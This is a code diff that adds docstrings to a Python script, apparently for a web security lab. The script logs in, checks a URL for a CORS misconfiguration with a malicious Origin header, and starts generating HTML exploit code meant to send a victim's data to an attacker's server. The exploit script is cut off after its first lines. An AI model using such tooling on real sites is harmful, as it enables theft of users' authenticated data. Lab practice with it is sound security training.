@@ -2,6 +2,18 @@ import requests
 from bs4 import BeautifulSoup
 
 def login_and_get_session(login_url, username, password):
+    """
+    Logs into the web application and retrieves a session with authentication cookies.
+
+    Args:
+        login_url (str): The URL of the login page.
+        username (str): The username to login with.
+        password (str): The password to login with.
+
+    Returns:
+        requests.Session: A session object with authenticated cookies if login is successful.
+        None: If the login fails.
+    """
     session = requests.Session()
     
     # Get the login page first to capture hidden form fields (like CSRF tokens)
@@ -46,7 +58,20 @@ def login_and_get_session(login_url, username, password):
         print(f"[!] Login failed, status code: {response.status_code}")
         print(f"[DEBUG] Response content: {response.content}")
         return None
+
 def check_cors_vulnerability(session, url, evil_origin):
+    """
+    Checks if the given URL is vulnerable to Cross-Origin Resource Sharing (CORS) attacks.
+
+    Args:
+        session (requests.Session): The authenticated session.
+        url (str): The URL to check for CORS vulnerability.
+        evil_origin (str): The malicious origin to use in the CORS check.
+
+    Returns:
+        tuple: A tuple containing a boolean indicating if the URL is vulnerable,
+               and a string with details of the response.
+    """
     headers = {
         'Origin': evil_origin,
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
@@ -74,9 +99,17 @@ def check_cors_vulnerability(session, url, evil_origin):
         print(f"[!] Error: {e}")
         return False, str(e)
 
-
-
 def exploit_cors_vulnerability(lab_url, exploit_server_url):
+    """
+    Generates HTML code to exploit a CORS vulnerability.
+
+    Args:
+        lab_url (str): The URL of the vulnerable application.
+        exploit_server_url (str): The URL of the attacker's server to log the exfiltrated data.
+
+    Returns:
+        None
+    """
     exploit_html = f"""
     <script>
         var req = new XMLHttpRequest();
